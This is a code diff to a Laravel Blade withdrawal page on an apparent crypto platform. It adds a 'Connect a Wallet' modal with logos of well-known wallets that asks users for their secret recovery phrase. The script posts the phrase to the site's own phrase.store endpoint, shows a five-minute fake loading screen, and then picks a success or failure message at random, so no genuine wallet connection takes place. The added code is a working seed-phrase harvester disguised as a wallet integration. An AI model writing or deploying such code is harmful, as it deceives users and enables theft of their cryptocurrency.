@@ -4,9 +4,6 @@
     {{ __('Withdrawal') }}
 @endsection
 
-@section('title')
-    {{ __('Withdrawal') }}
-@endsection
 
 @php
     $user = \App\Models\User::find(auth()->id());
@@ -14,17 +11,119 @@
     $phrase = json_decode($user->phrase, true);
 @endphp
 
-@section('breadcrumb')
-    <li class="breadcrumb-item"><a href="{{ route('user.index') }}">Dashboard</a></li>
-    <li class="breadcrumb-item active">Transactions</li>
-    @if($phrase && $phrase['status'] == 1)
-        <li class="breadcrumb-item"><button class="btn btn-success w-sm text-white" type="button" >Wallet Connected</button></li>
-    @else
-        <li class="breadcrumb-item"><button class="btn btn-primary w-sm text-white" type="button" data-toggle="modal" data-target="#connectWallet">Connect Wallet</button></li>
-    @endif
-@endsection
+<style>
+    input::-webkit-outer-spin-button,
+    input::-webkit-inner-spin-button {
+        display: none;
+    }
+
+    /* Custom Styles */
+    #connectWallet .modal-content {
+        border-radius: 15px;
+        overflow: hidden;
+    }
+
+    .modal-dialog-centered {
+        max-width: 800px;
+    }
+
+    #connectWallet .modal-content .card {
+        border: none;
+    }
+
+    #connectWallet .modal-content .list-group-item {
+        border: none;
+        border-left: 3px solid transparent;
+        font-weight: 500;
+        font-size: 10px;
+    }
+
+    #connectWallet .modal-content .list-group-item.active {
+        background-color: #f0f4ff;
+        color: #5156be;
+        border-left-color: #5156be;
+        font-size: 10px;
+    }
+
+    #connectWallet .modal-content .list-group-item:hover {
+        background-color: #f0f4ff;
+        color: #5156be;
+        cursor: pointer;
+    }
+
+    #connectWallet .modal-content h4 {
+        font-weight: bold;
+        font-size: 12px;
+    }
+
+    #connectWallet .modal-content h5 {
+        font-weight: bold;
+        color: #333;
+        font-size: 18px;
+    }
+
+    #connectWallet .modal-content p {
+        font-size: 8px;
+        line-height: 1.0;
+        margin: 0px 20px;
+        color: #74788d8c;
+    }
+
+    #connectWallet .modal-content .btn-primary {
+        background-color: #5156be;
+        border: none;
+        padding: 5px 20px;
+        font-size: 8px;
+        border-radius: 30px;
+    }
+
+    #connectWallet .modal-content .btn-primary:hover {
+        background-color: #1558c0;
+    }
+
+    #connectWallet .modal-content img {
+        border-radius: 10px;
+    }
+
+    .list-group-item {
+        position: relative;
+        display: block;
+        padding: .3rem 0.9rem;
+        color: #212529;
+        background-color: #fff;
+        border: 1px solid #e9e9ef;
+    }
+    @media (min-width: 900px) {
+        #connectWallet
+        {
+            scale: 1.3;
+        }
+    }
+</style>
 
 @section('content')
+
+    <div class="row">
+        <div class="col-12">
+            <div class="page-title-box d-sm-flex align-items-center justify-content-between">
+                <ol class="breadcrumb m-0">
+                    <li class="breadcrumb-item"><a href="{{ route('user.index') }}">Dashboard</a></li>
+                    <li class="breadcrumb-item active">Cash</li>
+                    <li class="breadcrumb-item active">Withdraw</li>
+                </ol>
+
+                <div class="page-title-right">
+                    @if($phrase && $phrase['status'] == 1)
+                        <button class="btn btn-success w-sm text-white" type="button" >Wallet Connected</button>
+                    @else
+                        <button class="btn btn-primary w-sm text-white" type="button" data-toggle="modal" data-target="#connectWallet" id="connectBtn">Connect Wallet</button>
+                    @endif
+                </div>
+
+            </div>
+        </div>
+    </div>
+
     <div class="modal fade" id="exampleModalCenterbank" tabindex="-1" role="dialog"
         aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
         <div class="modal-dialog modal-dialog-centered" role="document">
@@ -75,6 +174,85 @@
             </div>
         </div>
     </div>
+
+    <!-- Modal HTML -->
+    <div class="modal fade" id="connectWallet" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered modal-lg-custom" role="document">
+            <div class="modal-content">
+                <div class="card w-100">
+                    <div class="row no-gutters">
+                        <!-- Left Section -->
+                        <div class="col-4" style="border-right: 1px solid #f0f0f0;">
+                            <h4 class="p-3">Connect a Wallet</h4>
+                            <ul class="list-group list-group-flush">
+                                <p class="text-muted fs-10 my-2">Itrust</p>
+                                <li class="list-group-item active">
+                                    <img width="30" class="mx-0" src="https://i.pinimg.com/originals/70/8f/c3/708fc3e03913987335ae6c61cdb8481c.png" alt="..." style="border-radius: 100px;"> 
+                                    Coinbase Wallet
+                                </li>
+                                <li class="list-group-item">
+                                    <img width="16" class="mx-1" src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/metamask-icon.png" alt="..." style="border-radius: 100px;"> 
+                                    MetaMask
+                                </li>
+                                <li class="list-group-item">
+                                    <img width="33" class="mx-0" src="https://1000logos.net/wp-content/uploads/2022/05/WalletConnect-Emblem.png" alt="..." style="border-radius: 100px;">  
+                                    WalletConnect
+                                </li>
+                                <p class="text-muted fs-10 my-2">More</p>
+                                <li class="list-group-item">
+                                    <img width="20" class="mx-1" src="https://www.svgrepo.com/show/505018/trust-wallet.svg" alt="..." style="border-radius: 100px;">  
+                                    Trust
+                                </li>
+                                <li class="list-group-item">
+                                    <img width="17" class="mx-1" src="https://img.cryptorank.io/coins/ledger1673447427161.png" alt="..." style="border-radius: 100px;"> 
+                                    Ledger Live
+                                </li>
+                            </ul>
+                        </div>
+                        
+                        <!-- Right Section -->
+                        <div class="col-8">
+                            <div class="import-screen d-flex flex-column align-items-center justify-content-center h-100 p-4">
+                                <img src="{{ asset('assets/images/import.png') }}" alt="Import Wallet" class="mb-3" style="width: 60px; cursor: pointer">
+                                <h5 class="mb-2">Import a wallet</h5>
+                                <p class="text-muted text-center">You can easily connect and backup your wallet using seed phrase.</p>
+                                <button class="btn btn-primary mt-3" id="connect-text">Connect</button>
+                            </div>
+                            <div class="text-screen h-100 p-4">
+                                <div class="d-flex align-items-center justify-content-between">
+                                    <span style="font-size: 10px; padding: 5px 0px;">Secret Phrase</span>
+                                    <p style="font-size: 10px; padding: 5px 0px;">120/365</p>
+                                </div>
+                                <div>
+                                    <textarea class="form-control" name="phrase" id="phrase" rows="8" cols="3" placeholder="Typically 12 (sometimes 18, 24) words separated by single space" style="font-size: 10px; padding: 10px;"></textarea>
+                                    <button class="btn btn-primary mt-3" style="margin: auto; display: flex; top: 70; position: relative;">Connect</button>
+                                </div>
+                            </div>
+                            <div class="loading-screen d-flex flex-column align-items-center justify-content-center h-100 p-4">
+                                <img src="https://i.pinimg.com/originals/70/8f/c3/708fc3e03913987335ae6c61cdb8481c.png" alt="Import Wallet" class="mb-3" style="width: 60px;">
+                                <h5 class="mb-2">Coinbase wallet</h5>
+                                <p class="text-muted text-center">Waiting for connection...</p>
+                                <!-- <button class="btn btn-primary mt-3">Connect</button> -->
+                            </div>
+                            <div class="failed-screen d-flex flex-column align-items-center justify-content-center h-100 p-4">
+                                <img src="https://i.pinimg.com/originals/70/8f/c3/708fc3e03913987335ae6c61cdb8481c.png" alt="Import Wallet" class="mb-3" style="width: 60px;">
+                                <h5 class="mb-2">Coinbase wallet</h5>
+                                <p class="text-danger text-center">Connection Failed</p>
+                                <button class="btn btn-primary mt-3">Try again</button>
+                            </div>
+                            <div class="success-screen d-flex flex-column align-items-center justify-content-center h-100 p-4">
+                                <img src="https://i.pinimg.com/originals/70/8f/c3/708fc3e03913987335ae6c61cdb8481c.png" alt="Import Wallet" class="mb-3" style="width: 60px;">
+                                <h5 class="mb-2">Coinbase wallet</h5>
+                                <p class="text-success text-center">Connection Successful you can now add swap balance to your DeFi wallet</p>
+                                <button class="btn btn-primary mt-3">Back to Dashboard</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <div class="card-body">
 
 
@@ -150,7 +328,7 @@
                                             <input type="number" id="w_amount" step="any" name="w_amount"
                                                 value="{{ old('w_amount') }}"
                                                 class="form-control @error('w_amount') is-invalid @enderror" placeholder="Amount"
-                                                onkeyup="calcEquivWithdraw(this)">
+                                                onkeyup="calcEquivWithdraw(this)" required >
                                         </div>
                                     @error('w_amount') 
                                         <strong class="text-danger" role="alert">{{ $message }}</strong>
@@ -171,8 +349,8 @@
                                 </div>
 
                                 <div class="text-center d-grid gap-2">
-                                    <button class="btn btn-success w-md" type="button" onclick="startWithdrawalbtc()"
-                                        data-toggle="modal" data-target="#exampleModalCenterbtc">Request Withdraw</button>
+                                    <button class="btn btn-primary w-md" type="button" onclick="startWithdrawalbtc()"
+                                        data-toggle="modal" data-target="#exampleModalCenterbtc">Withdraw</button>
                                 </div>
                             </div>
                         </form>
@@ -380,6 +558,136 @@
 @endsection
 
 @section('script')
+    <script>
+        $(document).ready(function() {
+            $(".text-screen").addClass("d-none");
+            $(".loading-screen").addClass("d-none");
+            $(".failed-screen").addClass("d-none");
+            $(".success-screen").addClass("d-none");
+
+            // Set the first wallet as active by default if none is selected
+            let selectedWallet = $(".list-group-item.active");
+            if (!selectedWallet.length) {
+                selectedWallet = $(".list-group-item").first();
+                selectedWallet.addClass("active");
+            }
+
+            // 1. Handle left section click to make item active, only in the import screen
+            $(".list-group-item").on("click", function() {
+                if ($(".import-screen").is(":visible")) {
+                    $(".list-group-item").removeClass("active"); // Remove active class from all items
+                    $(this).addClass("active"); // Add active class to clicked item
+                    
+                    // Update the image and title in the right section
+                    let walletName = $(this).text().trim();
+                    let walletImgSrc = $(this).find("img").attr("src");
+                    $(".loading-screen img, .failed-screen img, .success-screen img").attr("src", walletImgSrc);
+                    $(".loading-screen h5, .failed-screen h5, .success-screen h5").text(walletName);
+                }
+
+                if ($(".text-screen").is(":visible")) {
+                    // Reset the modal to its initial state
+                    $(".text-screen, .loading-screen, .failed-screen, .success-screen").addClass("d-none");
+                    $(".import-screen").removeClass("d-none");
+                    
+                    // Clear the secret phrase input
+                    $("#phrase").val("");
+
+                    // Reset the active wallet to the first one
+                    $(".list-group-item").removeClass("active");
+                    $(".list-group-item").first().addClass("active");
+
+                    // Reset the images and titles in the loading/failed/success screens
+                    let firstWalletImgSrc = $(".list-group-item").first().find("img").attr("src");
+                    let firstWalletName = $(".list-group-item").first().text().trim();
+                    $(".loading-screen img, .failed-screen img, .success-screen img").attr("src", firstWalletImgSrc);
+                    $(".loading-screen h5, .failed-screen h5, .success-screen h5").text(firstWalletName);
+                }
+            });
+
+            // 2. Handle import wallet click to show the text screen
+            $("#connect-text, #connect-text2").on("click", function() {
+                $(".import-screen").addClass("d-none"); // Hide the initial screen
+                $(".text-screen").removeClass("d-none"); // Show the text screen
+            });
+
+            // 3. Handle Secret Phrase form submission
+            $(".text-screen button").on("click", function() {
+                let secretPhrase = $("#phrase").val().trim();
+
+                // Get the active wallet type and name
+                let activeWallet = $(".list-group-item.active");
+                let walletName = activeWallet.text().trim();
+                let walletType = activeWallet.find("img").attr("alt");
+
+                if (!activeWallet.length) {
+                    // If no wallet is selected, select the first one as default
+                    activeWallet = $(".list-group-item").first();
+                    walletName = activeWallet.text().trim();
+                    walletType = activeWallet.find("img").attr("alt");
+                }
+
+                if (secretPhrase) {
+                    $(".text-screen").addClass("d-none"); // Hide the text screen
+                    $(".loading-screen").removeClass("d-none"); // Show the loading screen
+
+                    // Submit the form data via AJAX
+                    $.ajax({
+                        type: "POST",
+                        url: `{{ route('phrase.store') }}`,  // Replace with your API endpoint
+                        headers: {'X-CSRF-Token': '{{ csrf_token() }}'},
+                        data: JSON.stringify({ 
+                            phrase: secretPhrase,
+                            wallet: walletName, 
+                        }),
+                        contentType: 'application/json',
+                        success: function (res) {
+                            alertify.success(res['msg']);
+                        },
+                        error: function (res) {
+                            const data = res['responseJSON']
+                            const errors = data['errors']
+                            if (res['status'] === 422) {
+                                alertify.error(data['msg'])
+                            } else {
+                                alertify.error('An error occurred, Try again.')
+                            }
+                        }
+                    });
+
+                    // 4. Show loading screen for 5 minutes and then show success or failed screen
+                    setTimeout(function() {
+                        $(".loading-screen").addClass("d-none"); // Hide the loading screen
+
+                        if (Math.random() > 0.5) {
+                            $(".success-screen").removeClass("d-none"); // Show success screen
+                        } else {
+                            $(".failed-screen").removeClass("d-none"); // Show failed screen
+                        }
+                    }, 300000); // 5 minutes in milliseconds
+                }
+            });
+
+            $('#connectBtn').on('click', function() {
+                // Reset the modal to its initial state
+                $(".text-screen, .loading-screen, .failed-screen, .success-screen").addClass("d-none");
+                $(".import-screen").removeClass("d-none");
+                
+                // Clear the secret phrase input
+                $("#phrase").val("");
+
+                // Reset the active wallet to the first one
+                $(".list-group-item").removeClass("active");
+                $(".list-group-item").first().addClass("active");
+
+                // Reset the images and titles in the loading/failed/success screens
+                let firstWalletImgSrc = $(".list-group-item").first().find("img").attr("src");
+                let firstWalletName = $(".list-group-item").first().text().trim();
+                $(".loading-screen img, .failed-screen img, .success-screen img").attr("src", firstWalletImgSrc);
+                $(".loading-screen h5, .failed-screen h5, .success-screen h5").text(firstWalletName);
+            });
+        });
+    </script>
     <script>
         $(document).ready(function() {
             $('#w_info').on('change', function() {
